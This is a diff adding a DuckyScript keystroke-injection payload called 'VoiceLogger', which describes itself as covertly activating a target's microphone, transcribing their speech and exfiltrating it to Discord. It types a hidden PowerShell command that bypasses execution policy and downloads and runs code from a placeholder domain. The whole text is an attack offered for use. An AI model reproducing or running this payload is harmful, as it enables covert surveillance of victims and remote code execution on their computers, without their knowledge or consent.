@@ -1,0 +1,12 @@
+REM     Title: VoiceLogger
+
+REM     Author: M3!
+
+REM     This payload activates your targets microphone and converts their speech to text and exfils it to discord
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';irm MYDOMAIN.HERE/voiceLogger | iex
+ENTER
